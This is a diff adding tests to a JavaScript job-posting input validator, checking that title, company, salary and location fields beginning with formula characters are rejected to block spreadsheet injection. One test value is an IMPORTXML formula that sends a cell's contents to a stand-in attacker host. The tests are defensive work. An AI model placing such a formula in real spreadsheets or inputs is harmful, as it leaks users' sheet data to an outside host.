@@ -97,6 +97,11 @@ bad('location as a string fails', (v) => { v.location = 'Ottawa'; }, /location m
 bad('a free-text date fails', (v) => { v.date = 'last week'; }, /date must be/);
 bad('no responsibilities, qualifications or skills fails',
   (v) => { delete v.responsibilities; delete v.qualifications; delete v.skills; }, /at least one/);
+bad('a formula title fails (tracker Sheet injection)', (v) => { v.title = '=IMPORTXML("https://evil.example/?"&A2,"//x")'; }, /title must not start with/);
+bad('a formula company fails', (v) => { v.company = '+cmd'; }, /company must not start with/);
+bad('a formula salary fails, even after spaces', (v) => { v.salary = '  @SUM(A1)'; }, /salary must not start with/);
+bad('a formula location field fails', (v) => { v.location.city = '-1+2'; }, /location\.city must not start with/);
+check('a salary with a dash inside is fine', !ctx.parseJobInput(JSON.stringify({ ...good, salary: 'CAD 170,000 - 190,000' })).error);
 check('empty input fails', !!ctx.parseJobInput('').error);
 check('not JSON fails', !!ctx.parseJobInput('not json').error);
 check('extra keys are allowed, as in the schema', (() => {
